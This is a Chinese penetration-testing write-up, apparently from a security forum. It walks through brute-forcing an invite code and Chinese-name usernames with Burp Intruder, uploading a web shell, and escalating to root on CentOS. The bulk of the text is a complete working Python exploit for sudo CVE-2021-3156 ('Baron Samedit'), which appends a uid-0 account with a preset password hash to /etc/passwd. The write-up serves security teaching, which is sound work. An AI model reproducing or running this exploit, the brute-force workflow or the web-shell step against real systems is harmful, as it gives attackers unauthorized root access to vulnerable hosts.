本篇过程均有授权，是为合法合规渗透。

### 本篇文章纯属虚构，如有类同实属巧合

0×01开局一个登录框
-----------

开局又是一个登录框，扫了目录没有其他入口。难道又要祭出拿手绝招（爆破弱口令吗），思路清晰，开搞。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-a310886cf9b4adc0d2098257f7957e568539bc92.png)  
直接上来爆破弱口令是行不通的，因为不知道账号规则去胡乱爆破一通，很容易被对方防护设备拦截到把自身的IP地址暴露或者被封禁。

看到有一个立即注册和忘记密码觉得可以搞一搞。

首先打开立即注册页面  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-38f4ec617e8b0cbc55b54a20c2fb0a29a8f777aa.png)  
可以看到我们可以去注册一个账号，输入账号、密码、手机号来注册尝试一下。（输入账号的时候尝试输入英文字母和数字是无法输入的，只能输入汉字，这点可以猜测账号是中文。）

之前以为这个邀请码是随便输入的，看来是不行的，用burp爆破一下邀请码吧。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b6fc7116005b17e1358c480c69ad31342ee83748.png)  
burp抓包就不说了，intruder模块配置选择数值，从00000-99999增量选择1。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b63cc62197c231c82bfb2004de781db36ab6cd3f.png)  
成功爆出邀请码，但是可以看到成功注册了，但是需要审核，先登录一下试试。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-4c4fa12a7bfb64eaecb1b71d4b3899b4ab8a8684.png)  
虽然成功爆破到了邀请码，但是注册的账号没有审核还是无法登录。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b69f570cd308305e476f2a7ebacc8b44de8dc065.png)  
不过我们之前注册账号的时候可以得知：账号命名规则是中文

那我们用burp来导入常见中文姓名来尝试爆破。

可以看到中文账号这里是经过url编码的，如果我们直接把中文导入burp是会乱码的。像这样  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f817ca6a24510fc69da78c8510054b3e1b7f03e4.png)  
我们需要把中文姓名经过URL编码之后再导入，用[站长之家](http://tool.chinaz.com/tools/urlencode.aspx)的在线工具就行  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-caf3efbb6adbd100eac286117d7bc6eb8724f062.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-a2d25b482d643b8d28e16639c8f92cfe2f5b5aa7.png)  
在爆破过程中发现有的显示账户不存在，有的显示密码不正确，然而返回包的长度都是一样的，有没有什么快速区分他们的方法呢，其实burp简单配置一下就可以实现这个功能。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-4699e628f125af325af92a6dbf6ac97e252731ec.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-45b3bce0ce121929ee0460ac28836556a3b57216.png)  
打开intruder的Options设置，找到Grep-Match，可以看到这个功能可以通过字符串或正则表达式进行内容匹配  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-73461386b0685f84cc772cd7e9f631070a600d91.png)  
先把原有的清空，然后输入我们想匹配的字符串，想要匹配中文字符的话可以先把中文字符转换成十六进制，然后通过正则匹配。

我们来匹配密码不正确的，使用python把密码不正确转换成十六进制  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f194c97c46d6feb2efb7ef6e71c0722f87b04c9b.png)  
然后把转换好的添加进去。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-08f62085c80a6930fb3718a941555d268ca36506.png)  
可以看到长度后面就是我们匹配的字符，这样就可以把存在的账号收集起来然后去爆破弱口令。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f312cd832c7df702e96780fee906e72887e7fd54.png)  
成功爆破出来一个账号  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-d0e50a1b54f1defa5bdc485c15ce2aeefcaa7f4e.png)  
登录进去  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5207f647c08607cedde466966924c9accd109659.png)  
找个上传点上传shell，一气呵成。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-678afb2f98b96ed3ef021cfd46dd8ff8bdeaf0eb.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-2d20e76cefd7eb87983a2acd4656dc8bb007acb1.png)  
看下系统权限  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-39e86c3cf2fd47586d52380b6a6d5c7431f87f01.png)  
查看系统版本  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-50186459b43d1b9baf2c44f4990e510e112d789c.png)  
可以看到是centos的系统，可以尝试使用sudo提权。

0×02提权
------

### sudo本地提权漏洞（CVE-2021-3156）

**漏洞详情：**

Sudo是一个功能强大的工具，其允许普通用户执行root权限命令，大多数基于Unix和Linux的操作系统都包含sudo。

2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。

当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。

安全研究人员于1月26日公开披露了此漏洞，并表示该漏洞已经隐藏了近十年。

**影响范围**

Sudo 1.8.2 - 1.8.31p2

Sudo 1.9.0 - 1.9.5p1

查看一下sudo的版本，可以看到这个版本是存在漏洞的。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ed6bd10b6838b115d231545721666ae22ebee28b.png)  
纠正一点，网上有的说“使用sudoedit -s /命令，如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复”这个说法是不准确的。具体的大家可以自己尝试，不要因为没有显示“sudoedit”就觉得不存在漏洞。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-08555a64f515aa8ff852d6d6800be32550fe9173.png)  
使用一个python脚本

```php
#!/usr/bin/python
import os
import sys
import resource
from struct import pack
from ctypes import cdll, c_char_p, POINTER

SUDO_PATH = b"/usr/bin/sudo"

PASSWD_PATH = '/etc/passwd'
APPEND_CONTENT = b"aa:$5$AZaSmJBP$lsgF8hex//kd.G4XxUJGaS618ZtYoQ796UpkM/8Ucm3:0:0:gg:/root:/bin/bash\n";

#STACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled
STACK_ADDR_PAGE = 0x7fffe5d35000

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)

def execve(filename, cargv, cenvp):
    libc.execve(filename, cargv, cenvp)

def spawn_raw(filename, cargv, cenvp):
    pid = os.fork()
    if pid:
        # parent
        _, exit_code = os.waitpid(pid, 0)
        return exit_code
    else:
        # child
        execve(filename, cargv, cenvp)
        exit(0)

def spawn(filename, argv, envp):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(env))(*env)
    return spawn_raw(filename, cargv, cenvp)

resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

# expect large hole for cmnd size is correct
TARGET_CMND_SIZE = 0x1b50

argv = [ "sudoedit", "-A", "-s", PASSWD_PATH, "A"*(TARGET_CMND_SIZE-0x10-len(PASSWD_PATH)-1)+"\\", None ]

SA = STACK_ADDR_PAGE

ADDR_REFSTR = pack('<Q', SA+0x20) # ref string

ADDR_PRIV_PREV = pack('<Q', SA+0x10)
ADDR_CMND_PREV = pack('<Q', SA+0x18) # cmndspec
ADDR_MEMBER_PREV = pack('<Q', SA+0x20)

ADDR_DEF_VAR = pack('<Q', SA+0x10)
ADDR_DEF_BINDING = pack('<Q', SA+0x30)

OFFSET = 0x30 + 0x20
ADDR_USER = pack('<Q', SA+OFFSET)
ADDR_MEMBER = pack('<Q', SA+OFFSET+0x40)
ADDR_CMND = pack('<Q', SA+OFFSET+0x40+0x30)
ADDR_PRIV = pack('<Q', SA+OFFSET+0x40+0x30+0x60)

# for spraying
epage = [
    'A'*0x8 + # to not ending with 0x00

    # fake def->var chunk (get freed)
    '\x21', '', '', '', '', '', '',
    ADDR_PRIV[:6], '',  # pointer to privilege
    ADDR_CMND[:6], '',  # pointer to cmndspec
    ADDR_MEMBER[:6], '',  # pointer to member

    # fake def->binding (list head) (get freed)
    '\x21', '', '', '', '', '', '',
    '', '', '', '', '', '', '', '',  # members.first
    'A'*0x10 + # members.last, pad

    # userspec chunk (get freed)
    '\x41', '', '', '', '', '', '', # chunk metadata
    '', '', '', '', '', '', '', '',  # entries.tqe_next
    'A'*8 +  # entries.tqe_prev
    '', '', '', '', '', '', '', '',  # users.tqh_first
    ADDR_MEMBER[:6]+'', '', # users.tqh_last
    '', '', '', '', '', '', '', '',  # privileges.tqh_first
    ADDR_PRIV[:6]+'', '', # privileges.tqh_last
    '', '', '', '', '', '', '', '',  # comments.stqh_first

    # member chunk
    '\x31', '', '', '', '', '', '', # chunk size , userspec.comments.stqh_last (can be any)
    'A'*8 + # member.tqe_next (can be any), userspec.lineno (can be any)
    ADDR_MEMBER_PREV[:6], '',  # member.tqe_prev, userspec.file (ref string)
    'A'*8 + # member.name (can be any because this object is not freed)
    pack('<H', 284), '',  # type, negated
    'A'*0xc+ # padding

    # cmndspec chunk
    '\x61'*0x8 + # chunk metadata (need only prev_inuse flag)
    'A'*0x8 + # entries.tqe_next
    ADDR_CMND_PREV[:6], '',  # entries.teq_prev
    '', '', '', '', '', '', '', '',  # runasuserlist
    '', '', '', '', '', '', '', '',  # runasgrouplist
    ADDR_MEMBER[:6], '',  # cmnd
    '\xf9'+'\xff'*0x17+ # tag (NOPASSWD), timeout, notbefore, notafter
    '', '', '', '', '', '', '', '',  # role
    '', '', '', '', '', '', '', '',  # type
    'A'*8 + # padding

    # privileges chunk
    '\x51'*0x8 + # chunk metadata
    'A'*0x8 + # entries.tqe_next
    ADDR_PRIV_PREV[:6], '',  # entries.teq_prev
    'A'*8 + # ldap_role
    'A'*8 + # hostlist.tqh_first
    ADDR_MEMBER[:6], '',  # hostlist.teq_last
    'A'*8 +  # cmndlist.tqh_first
    ADDR_CMND[:6], '',  # cmndlist.teq_last
]

cnt = sum(map(len, epage))
padlen = 4096 - cnt - len(epage)
epage.append('P'*(padlen-1))

env = [
    "A"*(7+0x4010 + 0x110) + # overwrite until first defaults
    "\x21\\", "\\", "\\", "\\", "\\", "\\", "\\", 
    "A"*0x18 + 
    # defaults
    "\x41\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", # next
    'a'*8 + # prev
    ADDR_DEF_VAR[:6]+'\\', '\\', # var
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", # val
    ADDR_DEF_BINDING[:6]+'\\', '\\', # binding
    ADDR_REFSTR[:6]+'\\', '\\',  # file
    "Z"*0x8 +  # type, op, error, lineno
    "\x31\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size (just need valid)
    'C'*0x638+  # need prev_inuse and overwrite until userspec
    'B'*0x1b0+
    # userspec chunk
    # this chunk is not used because list is traversed with curr->prev->prev->next
    "\x61\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size
    ADDR_USER[:6]+'\\', '\\', # entries.tqe_next points to fake userspec in stack
    "A"*8 + # entries.tqe_prev
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",  # users.tqh_first
    ADDR_MEMBER[:6]+'\\', '\\', # users.tqh_last
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "",  # privileges.tqh_first

    "LC_ALL=C",
    "SUDO_EDITOR=/usr/bin/tee -a", # append stdin to /etc/passwd
    "TZ=:",
]

ENV_STACK_SIZE_MB = 4
for i in range(ENV_STACK_SIZE_MB * 1024 / 4):
    env.extend(epage)

# last element. prepare space for '/usr/bin/sudo' and extra 8 bytes
env[-1] = env[-1][:-len(SUDO_PATH)-1-8]

env.append(None)

cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)

# write passwd line in stdin. it will be added to /etc/passwd when success by "tee -a"
r, w = os.pipe()
os.dup2(r, 0)
w = os.fdopen(w, 'w')
w.write(APPEND_CONTENT)
w.close()

null_fd = os.open('/dev/null', os.O_RDWR)
os.dup2(null_fd, 2)

for i in range(8192):
    sys.stdout.write('%d\r' % i)
    if i % 8 == 0:
        sys.stdout.flush()
    exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
    if exit_code == 0:
        print("success at %d" % i)
        break

```

这个脚本使用python2运行，部分centos自带python的。

把脚本上传到网站目录，然后反弹一个交互shell，运行脚本。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ffd3bc9bc2c9fca2c12d372306448d3ad663d408.png)  
成功后会生成一个aa的用户，默认密码为www  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f57008024b950d1a04786e7b183385f142d12dea.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-4ed97675c79016996893cf6335aa59e8347d2a6c.png)

0×03结论
------

善于运用工具可以为渗透带来极大的便利，尤其是BURP是一个非常强大的工具，这次渗透就是运用了BURP的各种功能，还有很多功能也是非常好用的，大家可以多研究。同时有需要学习BURP的朋友可以在社区看我的另一篇文章，[基于实战的Burp Suite插件使用技巧](https://forum.butian.net/share/651),欢迎大家跟我一起交流。